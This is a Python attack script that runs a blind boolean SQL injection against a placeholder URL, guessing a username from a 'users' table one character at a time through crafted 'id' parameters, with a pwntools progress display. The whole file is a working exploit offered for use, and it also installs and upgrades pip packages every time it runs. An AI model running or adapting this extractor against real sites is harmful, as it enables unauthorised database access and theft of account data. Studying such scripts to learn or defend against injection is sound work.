
#!/usr/bin/env python3

import sys
import signal
import string
import time
import requests
from pwn import * 
import subprocess
import pkg_resources

def check_and_install_libraries():
    required_libraries = ['requests', 'pwn']  # Add all required libraries here
    
    for library in required_libraries:
        try:
            pkg_resources.get_distribution(library)
        except pkg_resources.DistributionNotFound:
            print(f"{library} not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        else:
            print(f"Checking for updates: {library}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", library])
    
    print("All required libraries are installed and up to date.")

# Run the check before executing the main script
check_and_install_libraries()


def def_handler(sig, frame):
    """
    Handle Ctrl+C interrupt
    """
    print("\n\n[!] Exiting...")
    sys.exit(1)

# Set up Ctrl+C handler
signal.signal(signal.SIGINT, def_handler)

# Global variables
MAIN_URL = "http://test.com/"
CHARACTERS = string.printable

def make_sqli():
    """
    Perform SQL injection attack to extract user information
    """
    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted data")
    extracted_info = ""

    for position in range(1, 150):
        for character in range(33, 126):
            sqli_url = f"{MAIN_URL}?id=9 or (select(select ascii(substring(username,{position},1)) from users where id = 1) = {character})"

            p1.status(sqli_url)
            
            try:
                r = requests.get(sqli_url, timeout=10)
                
                if r.status_code == 200:
                    extracted_info += chr(character)
                    p2.status(extracted_info)
                    break
            except requests.RequestException as e:
                log.error(f"Request failed: {e}")
                continue

    p1.success("Brute force completed")
    p2.success(f"Final extracted data: {extracted_info}")

if __name__ == '__main__':
    make_sqli()
